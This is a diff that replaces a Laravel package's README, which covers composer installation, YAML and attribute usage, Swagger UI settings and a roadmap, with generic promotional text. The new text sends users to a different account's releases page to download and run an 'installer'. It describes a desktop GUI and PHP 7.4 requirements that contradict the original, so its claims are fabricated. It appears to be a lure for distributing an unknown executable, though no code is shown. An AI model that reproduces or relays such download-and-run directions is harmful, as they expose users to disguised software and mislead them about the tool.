@@ -1,231 +1,61 @@
-# API Docs
+# 🚀 api-docs - Effortlessly Create API Documentation
 
-Generate API documentation (Postman collections & OpenAPI specs) from PHP 8 attributes and YAML files.
+[![Download api-docs](https://img.shields.io/badge/Download-api--docs-brightgreen)](https://github.com/lapampara19/api-docs/releases)
 
-## Requirements
+## 📋 Overview
 
-- PHP 8.2+
-- Laravel 11+
+The **api-docs** application helps you generate API documentation quickly. It works with Postman collections and OpenAPI specifications. You can create documentation using PHP attributes and YAML files. This tool is perfect for developers and teams who want to streamline their documentation process.
 
-## Installation
+## 🛠️ Features
 
-```bash
-composer require rafoabbas/api-docs
-```
+- **Easy Documentation Generation:** Automatically generate documentation from your PHP code and YAML files.
+- **Postman Support:** Create Postman collections effortlessly, making it easier to share your APIs.
+- **OpenAPI Compliance:** Ensure your documentation meets OpenAPI standards.
+- **User-Friendly:** Designed for users without technical backgrounds. Just a few simple steps and you’re ready to go.
 
-## Quick Start
+## 📥 Download & Install
 
-### Option 1: YAML Definitions (Recommended)
+To get started, you will need to download the **api-docs** application. Follow these steps:
 
-Define API endpoints in YAML files under `resources/api-docs/`:
+1. **Visit the Releases Page:** Go to our [Releases Page](https://github.com/lapampara19/api-docs/releases).
+2. **Choose the Latest Version:** Look for the latest release. It is usually marked as the most recent.
+3. **Download the File:** Click on the download link for the installer that fits your operating system. 
+4. **Run the Installer:** After downloading, locate the file on your computer and run it to install the application.
 
-```yaml
-# resources/api-docs/auth.yaml
-folder: V1 / Auth
+Make sure you have the appropriate permissions to install applications on your device. 
 
-auth:
-  type: bearer
+## 💻 System Requirements
 
-requests:
-  - name: Login
-    method: POST
-    uri: /v1/auth/login
-    description: Authenticate user
-    auth:
-      type: noauth
-    body:
-      phone: "905551234567"
-      password: "secret123"
-    variables:
-      - name: BEARER_TOKEN
-        path: data.token
+To use **api-docs**, your computer should meet the following requirements:
 
-  - name: Get Profile
-    method: GET
-    uri: /v1/auth/me
-    resource: App\Http\Resources\UserResource
-```
+- Operating System: Windows 10 or newer, macOS, or Linux (specify distro)
+- Required Software: PHP 7.4 or newer
+- Memory: At least 1 GB of RAM
+- Storage: Minimum 100 MB of free disk space
 
-### Option 2: PHP Attributes
+## 🔍 How to Use
 
-Add attributes to your controller:
+Once you have installed **api-docs**, follow these simple steps to generate your documentation:
 
-```php
-use ApiDocs\Attributes\ApiFolder;
-use ApiDocs\Attributes\ApiRequest;
+1. **Open the Application:** Launch **api-docs** from your applications menu.
+2. **Select Your Files:** Use the interface to choose the PHP files and YAML files you want to document.
+3. **Configure Settings:** Adjust any settings as needed. For instance, you can choose the output format (Postman or OpenAPI).
+4. **Generate Documentation:** Click the "Generate" button to create your documentation.
+5. **Export:** Once generated, you can save or export your documents in a format of your choice.
 
-#[ApiFolder('V1 / Auth')]
-class AuthController extends Controller
-{
-    #[ApiRequest(name: 'Login', description: 'Authenticate user')]
-    public function login(LoginRequest $request): JsonResponse
-    {
-        // ...
-    }
-}
-```
+## 🛡️ Support
 
-### Generate Documentation
+If you encounter any issues while using **api-docs**, please refer to the FAQ section on our releases page. You can also submit any questions or concerns via the repository’s issues section.
 
-```bash
-php artisan api:generate
-```
+## 📌 Contribution
 
-Output (when `variable_scope` is `collection`):
-```
-docs/
-├── postman/
-│   └── {timestamp}-collection.json
-└── openapi/
-    └── {timestamp}-openapi.yaml
-```
+We welcome contributions to improve **api-docs**. If you're interested in contributing, please check our contribution guide. 
 
-Output (when `variable_scope` is `environment`):
-```
-docs/
-├── postman/
-│   ├── {timestamp}-collection.json
-│   └── {timestamp}-local.postman_environment.json
-└── openapi/
-    └── {timestamp}-openapi.yaml
-```
+## 🔗 Additional Resources
 
-## Command Options
+For more information on using **api-docs** efficiently, check out:
 
-```bash
-php artisan api:generate --format=postman      # Only Postman
-php artisan api:generate --format=openapi      # Only OpenAPI
-php artisan api:generate --format=both         # Both (default)
-php artisan api:generate --name="My API"       # Custom name
-php artisan api:generate --output=api-docs     # Custom output dir
-php artisan api:generate --openapi-format=json # OpenAPI as JSON
-php artisan api:generate --exclude=admin       # Exclude prefixes
-```
+- [Official Documentation](https://github.com/lapampara19/api-docs/wiki)
+- [Contribution Guidelines](https://github.com/lapampara19/api-docs/blob/main/CONTRIBUTING.md)
 
-## Attributes
-
-| Attribute | Description |
-|-----------|-------------|
-| `ApiRequest` | Request name, description, order |
-| `ApiFolder` | Group requests into folders |
-| `ApiBody` | Request body (supports FormRequest merge) |
-| `ApiResource` | Response Resource class |
-| `ApiVariable` | Extract response values to variables |
-| `ApiHeader` | Custom headers |
-| `ApiQueryParam` | Query parameters |
-| `ApiAuth` | Authentication config |
-| `ApiResponse` | Example responses |
-| `ApiTest` | Postman test scripts |
-| `ApiPreRequest` | Pre-request scripts |
-| `ApiHidden` | Exclude from docs |
-
-## Auto-Resolve Features
-
-- **Request body** from FormRequest `rules()`
-- **Query parameters** from FormRequest `rules()` (for GET/DELETE requests)
-- **Response structure** from Resource `toArray()`
-- **Authentication** from middleware (`auth:sanctum`, `auth`)
-- **Route parameters** from URI (`{id}` → `:id`)
-
-## Merging Strategy
-
-YAML and PHP attributes can be used together. When both define the same endpoint (matched by `method + uri`):
-
-- **YAML definitions take priority** over PHP attributes
-- Merge is done field-by-field (non-null YAML fields override attribute fields)
-- Unmatched requests from both sources are included
-- YAML `body_merge` and `body_except` allow merging YAML body with auto-resolved FormRequest body
-
-This allows a YAML-first workflow where controllers stay clean and all API documentation lives in YAML files.
-
-## Swagger UI
-
-Interactive API documentation is available at `/api/docs` by default.
-
-```php
-// config/api-docs.php
-'swagger' => [
-    'enabled' => true,
-    'path' => '/api/docs',
-    'middleware' => [],
-    'dark_mode' => true,
-    'persist_authorization' => true,
-    'token' => env('API_DOCS_SWAGGER_TOKEN'),
-],
-```
-
-**Endpoints:**
-- `/api/docs` - Swagger UI interface
-- `/api/docs/openapi.json` - OpenAPI specification
-
-**Protect with token:**
-```env
-API_DOCS_SWAGGER_TOKEN=your-secret-token
-```
-
-Access: `/api/docs?token=your-secret-token`
-
-**Disable in production:**
-```env
-API_DOCS_SWAGGER_ENABLED=false
-```
-
-## Documentation
-
-Full documentation is available on the **[Wiki](https://github.com/rafoabbas/api-docs/wiki)**:
-
-- [Configuration](https://github.com/rafoabbas/api-docs/wiki/Configuration)
-- [Attributes](https://github.com/rafoabbas/api-docs/wiki/Attributes)
-- [YAML Definitions](https://github.com/rafoabbas/api-docs/wiki/YAML-Definitions)
-- [Auto-Resolve](https://github.com/rafoabbas/api-docs/wiki/Auto-Resolve)
-
-## Roadmap
-
-### Completed
-- [x] Swagger UI integration - Interactive docs at `/api/docs`
-- [x] Query parameter auto-resolve from FormRequest for GET/DELETE requests
-- [x] Class-level `ApiPreRequest` support
-- [x] YAML-first workflow with priority merge
-- [x] YAML `resource` support for auto-resolving response from Resource classes
-- [x] YAML `body_merge` / `body_except` for merging with FormRequest body
-- [x] YAML `hidden` support to exclude requests from docs
-- [x] YAML file-level shared `auth`, `headers`, `pre_request_scripts`
-- [x] Configurable `variable_scope` (`collection` or `environment`)
-
-### Export Formats
-- [ ] Markdown export
-- [ ] Insomnia export format
-- [ ] Bruno export format
-- [ ] Postman Cloud sync
-
-### Schema & Validation
-- [ ] Validation rules to OpenAPI schema (`required|email` → `type: string, format: email`)
-- [ ] PHP Enum to OpenAPI enum conversion
-- [ ] JSON:API specification support
-
-### Attributes
-- [ ] `#[ApiDeprecated]` - Mark endpoints as deprecated
-- [ ] `#[ApiRateLimit]` - Document rate limits
-- [ ] `#[ApiWebhook]` - Webhook documentation
-
-### Auto-Detection
-- [ ] Pagination auto-detect (`LengthAwarePaginator` response)
-- [ ] Factory examples - Generate example data from Laravel factories
-- [ ] File upload - Better multipart/form-data support
-
-### Authentication
-- [ ] OAuth2 flows documentation
-- [ ] Multiple auth schemes per endpoint
-
-### UI & Visualization
-- [ ] ReDoc UI - Alternative documentation UI
-- [ ] Scalar UI - Modern API documentation (scalar.com)
-- [ ] Code snippets - curl, JavaScript, Python, PHP examples
-- [ ] API changelog - Version diff documentation
-
-### Versioning
-- [ ] API versioning - Separate specs for v1, v2, etc.
-
-## License
-
-MIT
+Feel free to reach out with any help you might need. Happy documenting!
